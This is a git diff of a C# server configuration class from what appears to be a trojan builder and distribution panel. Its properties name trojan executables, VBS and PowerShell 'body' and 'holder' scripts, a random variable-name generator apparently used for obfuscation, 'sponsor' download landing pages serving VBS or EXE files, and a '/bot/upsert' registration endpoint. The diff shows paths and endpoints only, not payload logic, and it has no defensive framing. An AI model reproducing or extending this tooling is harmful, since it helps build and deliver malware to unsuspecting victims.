@@ -15,46 +15,15 @@ public class ServerModel
     [JsonPropertyName("bux")] public List<BuxModel> Bux { get; set; }
 
     [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }
-
-    private string _landingName;
-
-    [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }
-
-    [JsonPropertyName("landingName")]
-    public string LandingName
-    {
-        get
-        {
-            if (string.IsNullOrEmpty(_landingName))
-                _landingName = "default";
-            return _landingName;
-        }
-        set { _landingName = value; }
-    }
-
-    [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
-
+  
     [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
-
-    // statics
     [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
 
 
     [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
     [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
-    [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
-    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
-
-    [JsonPropertyName("phpTemplateSponsorFile")]
-    public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
-
-    [JsonPropertyName("htmlTemplateSponsorFile")]
-    public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
-
     [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
-
-    public string UpdateFile { get; set; }
-
+    
     [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => ServerModelLoader.TroyanBuilder;
     [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
     [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
@@ -63,9 +32,7 @@ public class ServerModel
     [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
     [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
     [JsonPropertyName("troyanVbsDebug")] public string TroyanVbsDebug => Path.Join(TroyanOutputDir, "troyan.debug.vbs");
-
-    [JsonPropertyName("troyanVbsRelease")]
-    public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");
+    [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");
 
     [JsonPropertyName("body")] public string Body => Path.Join(TroyanOutputDir, "body.txt");
     [JsonPropertyName("bodyRelease")] public string BodyRelease => Path.Join(TroyanOutputDir, "body.release.ps1");
@@ -75,11 +42,14 @@ public class ServerModel
     [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
     [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
 
+    public string UserDataFile(string file)
+    {
+        return ServerModelLoader.UserDataFile(Server, file);
+    }
 
     [JsonPropertyName("userBody")] public string UserBody => ServerModelLoader.UserDataBody(Server);
     [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
     [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
-
     [JsonPropertyName("userDataDir")] public string UserDataDir => ServerModelLoader.UserDataDir(Server);
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
@@ -97,45 +67,39 @@ public class ServerModel
     {
         return VbsRandomer.GenerateRandomVariableName(10);
     }
-
-    [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"/default/{Random()}/none/GetVbs";
-    [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
-    [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"/default/GetVbsPhp";
-
-
-    public string UserDataFile(string file)
-    {
-        return ServerModelLoader.UserDataFile(Server, file);
-    }
     
-    [JsonPropertyName("userPhpVbsFile")]
-    public string UserPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}.php");
+    
+    [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
+    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
+    [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
+    [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
 
-    [JsonPropertyName("userSponsorPhpVbsFile")]
-    public string UserSponsorPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.php");
-
-    [JsonPropertyName("userSponsorHtmlVbsFile")]
-    public string UserSponsorHtmlVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.html");
-
-    [JsonPropertyName("userPhpExeFile")]
-    public string UserPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-exe.php");
-
-    [JsonPropertyName("userSponsorPhpExeFile")]
-    public string UserSponsorPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.php");
-
-    [JsonPropertyName("userSponsorHtmlExeFile")]
-    public string UserSponsorHtmlExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.html");
-
-    [JsonPropertyName("downloadIdentifier")]
-    public string DownloadIdentifier
+    
+    [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }
+    
+    private string _landingName;
+    [JsonPropertyName("landingName")]
+    public string LandingName
     {
         get
         {
-            if (!string.IsNullOrEmpty(LandingName))
-                return LandingName;
-            return "download";
+            if (string.IsNullOrEmpty(_landingName))
+                _landingName = "default";
+            return _landingName;
         }
+        set { _landingName = value; }
     }
+
+    [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
+    
+    [JsonPropertyName("landingDir")] public string LandingDir => Path.Combine(UserDataDir, "landing");
+    [JsonPropertyName("landingPhpVbsFile")] public string LandingPhpVbsFile => Path.Join(LandingDir, $"{LandingName}.php");
+    [JsonPropertyName("landingSponsorPhpVbsFile")] public string LandingSponsorPhpVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.php");
+    [JsonPropertyName("landingSponsorHtmlVbsFile")] public string LandingSponsorHtmlVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.html");
+
+    [JsonPropertyName("landingPhpExeFile")] public string LandingPhpExeFile => Path.Join(LandingDir, $"{LandingName}-exe.php");
+    [JsonPropertyName("landingSponsorPhpExeFile")] public string LandingSponsorPhpExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.php");
+    [JsonPropertyName("landingSponsorHtmlExeFile")] public string LandingSponsorHtmlExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.html");
 
 
     //Update
@@ -176,13 +140,6 @@ public class ServerModel
         }
     }
 
-    //Update
-    [JsonPropertyName("updateUrlBlock")]
-    public string UpdateUrlMono
-    {
-        get { return UpdateUrlFolder + "block/"; }
-    }
-
     // properties
     [JsonPropertyName("login")] public string Login { get; set; }
 
@@ -213,7 +170,7 @@ public class ServerModel
                 result += Server;
             }
 
-            result += "/upsert";
+            result += "/bot/upsert";
             return result;
         }
     }
